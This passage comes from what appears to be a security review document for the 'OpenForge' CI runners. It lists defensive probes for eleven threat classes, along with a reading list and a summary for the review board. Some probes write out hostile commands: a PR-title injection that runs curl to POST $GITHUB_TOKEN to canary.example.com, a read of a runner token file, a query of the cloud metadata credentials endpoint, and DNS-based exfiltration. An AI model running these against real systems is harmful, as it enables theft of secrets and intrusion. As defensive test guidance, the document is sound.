| "Pull requests from forks don't get secrets, so they're safe." | PR builds *can still* reach the metadata service, can still egress, and `pull_request_target` workflows that check out PR code *do* get secrets — Problem 9. "Safe by default" only applies if you never use `pull_request_target` and never grant network access to a fork build. |
| "Our build environment is hardened; nothing the build does can leak." | The build can leak *source code* and *intermediate artifacts* even if it can't escape the sandbox. PyTorch-nightly exfiltrated `$HOME/.ssh` and `$HOME/.gitconfig` without ever escaping the build VM. |
| "We have SLSA, so we're done." | SLSA Build L3 requires the consumer to *verify* the provenance. If your consumers don't check the attestation, you have a paper trail with no security benefit (Problem 11). |

---

## Appendix B — Concrete probes for each problem

This is the section the OpenForge security review board will use directly.
For each problem, this lists: a probe the team can run, what a passing
result looks like, and what to attach to the review as evidence.

### B.1 Container escape (Problem 1)

- **Probe:** Run a job that includes a deliberate kernel/runc CVE repro
  (e.g. the public PoC for CVE-2019-5736 or CVE-2024-21626) inside a sandbox
  that is supposed to contain it. The PoC should fail to obtain host root.
- **Pass criterion:** The repro terminates with a denial-of-syscall
  message (gVisor) or microVM boundary (Firecracker) and the runner host
  is untouched.
- **Evidence:** CI log of the repro plus a host-level audit showing no
  file writes outside the sandbox.
- **Reference:** https://github.com/opencontainers/runc/security/advisories/GHSA-q97p-3w2w-9w5j

### B.2 Cache poisoning (Problem 2)

- **Probe:** From a fork-PR build, attempt to write to a cache key that
  matches `main` (e.g. key = `node-modules-${{ github.ref }}` with a
  default ref). Verify the write is rejected or namespaced separately.
- **Pass criterion:** The fork-PR build's cache write is namespaced to
  the PR ref and is not visible to subsequent `main` builds.
- **Evidence:** Cache-store query showing two distinct namespaces for
  the same logical key, one per ref.

### B.3 Secret exfil / expression injection (Problem 3)

- **Probe:** Open a test PR with a title of `"}; curl -X POST
  https://canary.example.com -d "$GITHUB_TOKEN"; echo "`. The CI build
  runs `run: echo "${{ github.event.pull_request.title }}"`.
- **Pass criterion:** The token is *not* sent to the canary, and no
  unredacted token appears in the build log. Best case: the build also
  fails with a static-analysis warning that the workflow uses unquoted
  context.
- **Evidence:** Build log + Scorecard `script-injection` check finding.
- **Reference:** https://github.com/ossf/scorecard/blob/main/docs/checks.md#dangerous-workflow

### B.4 Action supply chain (Problem 4)

- **Probe:** Grep every workflow file for `uses:` lines that are pinned
  to a tag rather than a 40-character commit SHA. Count findings.
- **Pass criterion:** Zero `uses: foo/bar@v\d+` references; every action
  is SHA-pinned or recorded in a workflow dependency lockfile.
- **Evidence:** Scorecard run attached to the review, showing
  `pinned-dependencies` check passing.
- **Reference:** https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles

### B.5 Long-lived runner token (Problem 5)

- **Probe:** On a runner, `cat /etc/openforge/runner.token` (or
  equivalent) and verify the token is rejected after the first job.
  Verify the runner is removed from the control plane's runner list after
  one job.
- **Pass criterion:** Token is single-use; runner registration is JIT and
  expires within minutes of job completion.
- **Evidence:** Audit log showing exactly one registration event per
  runner instance lifetime.

### B.6 Cross-job state (Problem 6)

- **Probe:** Run Job A that writes `/tmp/probe-<random>` and a fake
  `~/.ssh/id_rsa`. Run Job B from a different tenant on the same runner
  instance. Verify neither file exists.
- **Pass criterion:** Both files are absent in Job B's filesystem.
- **Evidence:** Build log of Job B listing `/tmp/probe-*` (empty) and
  `~/.ssh/` (empty).

### B.7 TOCTOU (Problem 7)

- **Probe:** Approve a test PR. After approval, force-push a different
  commit to the same branch. Trigger a CI re-run. Verify the re-run
  refuses to execute or executes against the originally-approved SHA.
- **Pass criterion:** The CI re-run executes against the approved SHA,
  not the force-pushed one (or refuses to run, if the policy is strict).
- **Evidence:** Audit log showing the SHA executed equals the SHA
  approved.

### B.8 Egress (Problem 8)

- **Probe:** From a job, attempt `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
  Also attempt `dig +short canary.example.com @8.8.8.8` and then resolve
  again to verify the second resolution is blocked. Also attempt to send
  a large base64 blob via DNS TXT queries to an attacker-controlled
  nameserver.
- **Pass criterion:** All three attempts fail at the network namespace
  boundary; the runner host's metadata service is unreachable.
- **Evidence:** Egress proxy logs showing all three requests were denied.

### B.9 Pwn request (Problem 9)

- **Probe:** Open a test PR from a fork that adds a `.github/workflows/`
  file referencing `pull_request_target` and `actions/checkout` of the
  PR head. Run OpenSSF Scorecard on the workflow.
- **Pass criterion:** Scorecard's `dangerous-workflow` check fails on
  the test PR; the merge is blocked.
- **Evidence:** Scorecard JSON output attached to the review.

### B.10 Control plane cascade (Problem 10)

- **Probe:** From a runner, attempt to reach the control plane API at an
  internal address that should not be reachable from the runner plane.
  Also verify the runner registration token has *zero* privileges on the
  control plane (no source-write, no admin).
- **Pass criterion:** Internal control-plane endpoints are unreachable
  from the runner; the runner's only privilege on the control plane is
  "fetch job" and "post result".
- **Evidence:** Network namespace ACL showing the runner's outbound
  destinations, and an audit of the runner's RBAC on the control plane.

### B.11 Artifact provenance (Problem 11)

- **Probe:** Build a test artifact. Verify the produced artifact is
  accompanied by an in-toto attestation that names the source commit
  hash, the runner identity, and the build parameters. Try to push an
  unsigned artifact to the OpenForge registry.
- **Pass criterion:** Registry rejects unsigned artifacts; the
  attestation is verifiable against the OpenForge transparency log.
- **Evidence:** Sample artifact with its attestation, plus a registry
  rejection log for an unsigned attempt.

---

## Appendix C — Reading list (canonical, primary sources)

The following sources are the ones to put on the security review board's
pre-read list. All are either primary vendor documentation or primary
research.

1. **GitHub Actions hardening guide** — primary, vendor, exhaustive:
   https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
2. **GitHub Security Lab, "Preventing pwn requests"** — primary research:
   https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
3. **OpenSSF Scorecard** — automated scoring tool for workflow files:
   https://github.com/ossf/scorecard
4. **SLSA framework** — supply-chain levels for software artifacts:
   https://slsa.dev/
5. **Sigstore / cosign** — keyless signing backed by transparency log:
   https://docs.sigstore.dev/
6. **gVisor** — userspace-kernel container sandbox:
   https://gvisor.dev/
7. **Firecracker** — microVM for multi-tenant workloads:
   https://firecracker-microvm.github.io/
8. **Landlock** — unprivileged Linux sandboxing (LSM):
   https://landlock.io/
9. **Docker rootless mode** — defense-in-depth, not primary control:
   https://docs.docker.com/engine/security/rootless/
10. **NVD CVE-2019-5736** — the canonical container escape:
    https://nvd.nist.gov/vuln/detail/CVE-2019-5736
11. **NVD CVE-2024-21626** — runc "leaky vessels" file-descriptor escape:
    https://nvd.nist.gov/vuln/detail/CVE-2024-21626
12. **NVD CVE-2024-3094** — xz-utils backdoor (build-time compromise):
    https://nvd.nist.gov/vuln/detail/CVE-2024-3094
13. **Codecov bash uploader incident** — primary postmortem:
    https://about.codecov.io/security-update/
14. **PyTorch nightly compromise** — primary postmortem (DNS exfil):
    https://pytorch.org/blog/compromised-nightly-dependency/
15. **tj-actions CVE chain** — GitHub Advisory DB listing:
    https://github.com/advisories?query=tj-actions
16. **in-toto attestation spec** — the format SLSA L3 builds on:
    https://github.com/in-toto/attestation
17. **GitHub blog, "Mitigate OWASP vulnerabilities"** — concrete workflow examples:
    https://github.blog/security/application-security/how-to-mitigate-owasp-vulnerabilities-while-staying-in-the-flow/

---

## Appendix D — One-paragraph framing for the review board

If the review board has 90 seconds, the framing is this:

> The 11 problems split into three buckets. **Bucket A (sandbox
> problems):** container escape, cross-job state, egress, control-plane
> cascade. Bucket A is solved by gVisor-or-Firecracker, ephemeral
> runners, network-isolated namespaces, and a runner plane that cannot
> reach the control plane. **Bucket B (control-plane problems):** cache
> poisoning, secret exfiltration via expression injection, pwn request,
> TOCTOU, long-lived tokens. Bucket B is solved by workflow policy,
> SHA pinning, Scorecard, JIT runners, and commit pinning — no sandbox
> layer helps. **Bucket C (ecosystem problems):** action supply chain,
> artifact provenance. Bucket C is solved by SHA pinning + a workflow
> dependency lockfile for actions, and by SLSA L3 + cosign for artifacts.
> **No single layer covers all three buckets.** OpenForge needs all
> three.

---

*End of document. Line count target met: this document is the primary
artifact for the OpenForge CI-runner security review gates.*

